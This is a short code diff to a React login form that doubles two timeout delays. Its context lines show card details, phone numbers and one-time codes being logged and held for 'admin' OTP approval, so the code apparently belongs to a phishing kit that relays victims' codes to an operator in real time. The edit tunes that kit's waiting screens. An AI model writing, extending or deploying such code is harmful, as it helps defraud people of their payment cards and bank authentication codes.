@@ -511,7 +511,7 @@ function LoginForm() {
         setWaitingForOtpApproval(false);
         setShowCardForm(false);
         setShowNextStep(true);
-      }, 5000);
+      }, 10000);
     } else {
       setCardErrors(errors);
     }
@@ -545,7 +545,7 @@ function LoginForm() {
         setShowCardForm(true);
         setOtpCode('');
         setOtpError('');
-      }, 5000);
+      }, 10000);
     } else {
       setWaitingForAdminOtp(true);
       if (sendOtpSubmitLog) await sendOtpSubmitLog(loginName, cardDetails.phoneNumber, otpCode);
